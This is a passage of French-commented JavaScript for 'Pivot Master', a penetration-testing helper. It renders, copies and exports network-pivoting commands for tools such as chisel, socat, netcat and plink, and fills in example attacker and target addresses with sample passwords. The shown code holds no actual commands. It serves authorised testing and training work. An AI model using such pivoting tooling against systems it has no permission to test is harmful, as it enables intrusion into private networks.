            // Ajouter les sections de commandes
            data.sections.forEach(section => {
                const sectionElement = document.createElement('div');
                sectionElement.className = 'command-section';
                sectionElement.innerHTML = `
                    <div class="section-header">
                        <h5>${section.title}</h5>
                        <p>${section.description}</p>
                    </div>
                    <div class="command-block">
                        <pre><code>${section.command}</code></pre>
                        <button class="copy-button" onclick="window.pivotMaster.copyToClipboard(this)">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                    ${section.comment ? `<p class="command-comment">${section.comment}</p>` : ''}
                `;
                content.appendChild(sectionElement);
            });

            tabsContent.appendChild(content);
        });

        // Ajouter le bouton de copie global
        const copyAllButton = document.createElement('button');
        copyAllButton.className = 'copy-all-button';
        copyAllButton.innerHTML = '<i class="fas fa-copy"></i> Copier toutes les commandes';
        copyAllButton.onclick = () => this.copyAllCommands();
        tabsContent.appendChild(copyAllButton);
    }

    switchTab(tool) {
        try {
            // Mettre à jour les onglets
            const tabs = document.querySelectorAll('.tab-button');
            tabs.forEach(tab => tab.classList.remove('active'));

            // Mettre à jour le contenu
            const contents = document.querySelectorAll('.tab-pane');
            contents.forEach(content => content.classList.remove('active'));

            // Activer l'onglet sélectionné
            const selectedTab = Array.from(tabs).find(tab => tab.querySelector(`i.${this.getToolIcon(tool)}`));
            const selectedContent = document.getElementById(`${tool}Content`);

            if (selectedTab) selectedTab.classList.add('active');
            if (selectedContent) selectedContent.classList.add('active');
        } catch (error) {
            console.error('Erreur lors du changement d\'onglet:', error);
        }
    }

    getToolIcon(tool) {
        const icons = {
            ssh: 'fa-terminal',
            chisel: 'fa-hammer',
            ligolo: 'fa-network-wired',
            socat: 'fa-exchange-alt',
            netcat: 'fa-plug',
            proxychains: 'fa-link',
            rpivot: 'fa-project-diagram',
            plink: 'fa-windows'
        };
        return icons[tool] || 'fa-tools';
    }

    copyAllCommands() {
        if (!this.generatedCommands) return;

        let allCommands = '';
        Object.entries(this.generatedCommands).forEach(([tool, commands]) => {
            allCommands += `# ${commands.title}\n`;
            allCommands += `# ${commands.description}\n\n`;
            
            if (commands.sections && Array.isArray(commands.sections)) {
                commands.sections.forEach(section => {
                    allCommands += `# ${section.title}\n`;
                    allCommands += `# ${section.description}\n`;
                    allCommands += `${section.command}\n`;
                    if (section.comment) {
                        allCommands += `# ${section.comment}\n`;
                    }
                    allCommands += '\n';
                });
            }
            
            allCommands += '\n';
        });

        navigator.clipboard.writeText(allCommands).then(() => {
            this.showNotification('Toutes les commandes ont été copiées !', 'success');
        }).catch(err => {
            this.showNotification('Erreur lors de la copie des commandes', 'danger');
        });
    }

    /**
     * Export en script
     */
    exportScript() {
        const { attacker, target1, target2, target3, doublePivot } = this.config;
        
        let script = `#!/bin/bash\n`;
        script += `# Pivot Script - Généré par Pivot Master\n`;
        script += `# Configuration:\n`;
        script += `#   Attacker: ${attacker.ip}:${attacker.port}\n`;
        script += `#   Target1:  ${target1.ip} (${target1.user}@${target1.os})\n`;
        script += `#   Target2:  ${target2.ip}:${target2.port} (${target2.os})\n`;
        if (doublePivot) {
            script += `#   Target3:  ${target3.ip}:${target3.port}\n`;
        }
        script += `\n`;

        for (const [technique, commands] of Object.entries(this.generatedCommands)) {
            script += `\n# === ${this.getTechniqueDisplayName(technique)} ===\n`;
            
            commands.sections.forEach(section => {
                script += `\n# ${section.title}\n`;
                if (section.description) {
                    script += `# ${section.description}\n`;
                }
                if (section.command) {
                    script += `${section.command}\n`;
                    if (section.comment) {
                        script += `# ${section.comment}\n`;
                    }
                }
            });
        }

        this.downloadFile('pivot-commands.sh', script);
        this.showNotification('Script exporté !', 'success');
    }

    /**
     * Export cheatsheet
     */
    exportCheatsheet() {
        let markdown = `# Pivot Cheatsheet\n\n`;
        markdown += `**Généré par Pivot Master**\n\n`;
        markdown += `## Configuration\n\n`;
        markdown += `- **Attacker:** ${this.config.attacker.ip}:${this.config.attacker.port}\n`;
        markdown += `- **Target 1:** ${this.config.target1.ip} (${this.config.target1.user}@${this.config.target1.os})\n`;
        markdown += `- **Target 2:** ${this.config.target2.ip}:${this.config.target2.port} (${this.config.target2.os})\n`;
        if (this.config.doublePivot) {
            markdown += `- **Target 3:** ${this.config.target3.ip}:${this.config.target3.port}\n`;
        }
        markdown += `\n`;

        for (const [technique, commands] of Object.entries(this.generatedCommands)) {
            markdown += `## ${this.getTechniqueDisplayName(technique)}\n\n`;
            
            commands.sections.forEach(section => {
                markdown += `### ${section.title}\n\n`;
                markdown += '```bash\n';
                markdown += section.command;
                markdown += '\n```\n\n';
            });
        }

        this.downloadFile('pivot-cheatsheet.md', markdown);
        this.showNotification('Cheatsheet exportée !', 'success');
    }

    /**
     * Télécharger un fichier
     */
    downloadFile(filename, content) {
        const blob = new Blob([content], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    /**
     * Effacer le formulaire
     */
    clearForm() {
        if (confirm('Effacer toutes les données ?')) {
            localStorage.removeItem('pivotMasterConfig');
            location.reload();
        }
    }

    /**
     * Charger un exemple
     */
    loadExample() {
        try {
            // Charger les valeurs d'exemple
            const elements = {
                attackerIp: document.getElementById('attackerIp'),
                attackerPort: document.getElementById('attackerPort'),
                target1Ip: document.getElementById('target1Ip'),
                target1Port: document.getElementById('target1Port'),
                target1User: document.getElementById('target1User'),
                target1Password: document.getElementById('target1Password'),
                target2Ip: document.getElementById('target2Ip'),
                target2Port: document.getElementById('target2Port'),
                target2User: document.getElementById('target2User'),
                target2Password: document.getElementById('target2Password'),
                doublePivot: document.getElementById('doublePivot')
            };

            // Vérifier si tous les éléments existent
            for (const [key, element] of Object.entries(elements)) {
                if (!element) {
                    console.error(`Élément manquant: ${key}`);
                    this.showNotification(`Erreur: Élément ${key} non trouvé`, 'error');
                    return;
                }
            }

            // Définir les valeurs d'exemple
            elements.attackerIp.value = '10.10.14.15';
            elements.attackerPort.value = '4444';
            elements.target1Ip.value = '192.168.1.100';
            elements.target1Port.value = '22';
            elements.target1User.value = 'user';
            elements.target1Password.value = 'password123';
            elements.target2Ip.value = '172.16.1.100';
            elements.target2Port.value = '3389';
            elements.target2User.value = 'admin';
            elements.target2Password.value = 'admin123';
            elements.doublePivot.checked = true;

            // Sélectionner quelques outils par défaut
            const toolCheckboxes = document.querySelectorAll('input[name="tools"]');
            toolCheckboxes.forEach(checkbox => {
                if (['ssh', 'chisel'].includes(checkbox.value)) {
                    checkbox.checked = true;
                } else {
                    checkbox.checked = false;
                }
            });

            // Sauvegarder la configuration
        this.saveConfig();

            // Mettre à jour l'interface
            this.toggleDoublePivot();
            this.updateNetworkVisualization();

            this.showNotification('Exemple chargé avec succès', 'success');
        } catch (error) {
            console.error('Erreur lors du chargement de l\'exemple:', error);
            this.showNotification('Erreur lors du chargement de l\'exemple', 'error');
        }
    }

    /**
     * Afficher une notification
     */
    showNotification(message, type = 'info', duration = 4000) {
        const container = document.getElementById('notificationContainer');
        if (!container) return;

        const toast = document.createElement('div');
        toast.className = `notification-toast alert-${type}`;
        toast.textContent = message;

        container.appendChild(toast);

        setTimeout(() => {
            toast.remove();
        }, duration);
    }

    updateNetworkVisualization() {
        try {
            const config = {
                attacker: {
                    ip: document.getElementById('attackerIp')?.value || '',
                    port: document.getElementById('attackerPort')?.value || ''
                },
                target1: {
                    ip: document.getElementById('target1Ip')?.value || '',
                    port: document.getElementById('target1Port')?.value || '',
                    user: document.getElementById('target1User')?.value || '',
                    password: document.getElementById('target1Password')?.value || ''
                },
                target2: {
                    ip: document.getElementById('target2Ip')?.value || '',
                    port: document.getElementById('target2Port')?.value || '',
                    user: document.getElementById('target2User')?.value || '',
                    password: document.getElementById('target2Password')?.value || ''
                },
                doublePivot: document.getElementById('doublePivot')?.checked || false
            };

            // Créer les nœuds
            const nodes = new vis.DataSet([
                {
                    id: 1,
                    label: `Attaquant\n${config.attacker.ip}`,
                    group: 'attacker',
                    title: 'Machine Attaquante'
                },
                {
                    id: 2,
                    label: `Target 1\n${config.target1.ip}`,
                    group: 'target1',
                    title: 'Premier Pivot'
                }
            ]);

            // Créer les arêtes
            const edges = new vis.DataSet([
                {
                    from: 1,
                    to: 2,
                    arrows: 'to',
                    label: 'Tunnel'
                }
            ]);

            // Ajouter Target 2 si double pivot est activé
            if (config.doublePivot && config.target2.ip) {
                nodes.add({
                    id: 3,
                    label: `Target 2\n${config.target2.ip}`,
                    group: 'target2',
                    title: 'Second Pivot'
                });
                edges.add({
                    from: 2,
                    to: 3,
                    arrows: 'to',
                    label: 'Tunnel'
                });
            }

            // Configuration du réseau
            const options = {
                nodes: {
                    shape: 'dot',
                    size: 20,
                    font: {
                        size: 14
                    }
                },
                edges: {
                    font: {
                        size: 12
                    }
                },
                groups: {
                    attacker: {
                        color: { background: '#ff4444', border: '#cc0000' }
                    },
                    target1: {
                        color: { background: '#44ff44', border: '#00cc00' }
                    },
                    target2: {
                        color: { background: '#4444ff', border: '#0000cc' }
                    }
                },
                physics: {
                    stabilization: true,
                    barnesHut: {
                        gravitationalConstant: -2000,
                        springConstant: 0.04,
                        springLength: 200
                    }
                }
            };

            // Créer ou mettre à jour le réseau
            const container = document.getElementById('network');
            if (container) {
                if (this.network) {
                    this.network.setData({ nodes, edges });
                } else {
                    this.network = new vis.Network(container, { nodes, edges }, options);
                }
            }
        } catch (error) {
            console.error('Erreur lors de la mise à jour de la visualisation réseau:', error);
        }
    }

    // Fonction pour copier le texte dans le presse-papiers
    copyToClipboard(button) {
        try {
            const commandBlock = button.closest('.command-block');
            const codeElement = commandBlock.querySelector('code');
            const textToCopy = codeElement.textContent;

            navigator.clipboard.writeText(textToCopy).then(() => {
                // Changer temporairement l'icône pour indiquer le succès
                const icon = button.querySelector('i');
                const originalClass = icon.className;
                icon.className = 'fas fa-check';
                
                // Restaurer l'icône originale après 2 secondes
                setTimeout(() => {
                    icon.className = originalClass;
                }, 2000);

                this.showNotification('Commande copiée dans le presse-papiers', 'success');
            }).catch(err => {
                console.error('Erreur lors de la copie:', err);
                this.showNotification('Erreur lors de la copie de la commande', 'error');
            });
        } catch (error) {
            console.error('Erreur lors de la copie:', error);
            this.showNotification('Erreur lors de la copie de la commande', 'error');
        }
    }
}

// Fonctions globales pour les événements HTML
function generateCommands() { 
    if (window.pivotMaster) {
        window.pivotMaster.generateCommands();
    } else {
        console.error('PivotMaster n\'est pas initialisé');
    }
}

function clearForm() { 
    if (window.pivotMaster) {
        window.pivotMaster.clearForm();
    }
}

function loadExample() { 
    if (window.pivotMaster) {
        window.pivotMaster.loadExample();
    }
}

function copyAllCommands() { 
    if (window.pivotMaster) {
        window.pivotMaster.copyAllCommands();
    }
}

function exportScript() { 
    if (window.pivotMaster) {
        window.pivotMaster.exportScript();
    }
}

function exportCheatsheet() { 
    if (window.pivotMaster) {
        window.pivotMaster.exportCheatsheet();
    }
}

// Fonctions globales pour la visualisation réseau
function resetNetworkView() {
    if (pivotMaster.networkVisualizer) {
        pivotMaster.networkVisualizer.resetNetwork();
    }
}

function fitNetworkView() {
    if (pivotMaster.networkVisualizer) {
        pivotMaster.networkVisualizer.fitNetwork();
    }
}

function exportNetworkImage() {
    if (pivotMaster.networkVisualizer) {
        pivotMaster.networkVisualizer.exportImage();
    }
}

function toggleNetworkPhysics() {
    if (pivotMaster.networkVisualizer) {
        pivotMaster.networkVisualizer.togglePhysics();
    }
}

// Initialisation de l'application
document.addEventListener('DOMContentLoaded', async () => {
    try {
        window.pivotMaster = new PivotMaster();
        await window.pivotMaster.init();
        console.log('PivotMaster initialisé avec succès');
    } catch (error) {
        console.error('Erreur lors de l\'initialisation de PivotMaster:', error);
    }
}); 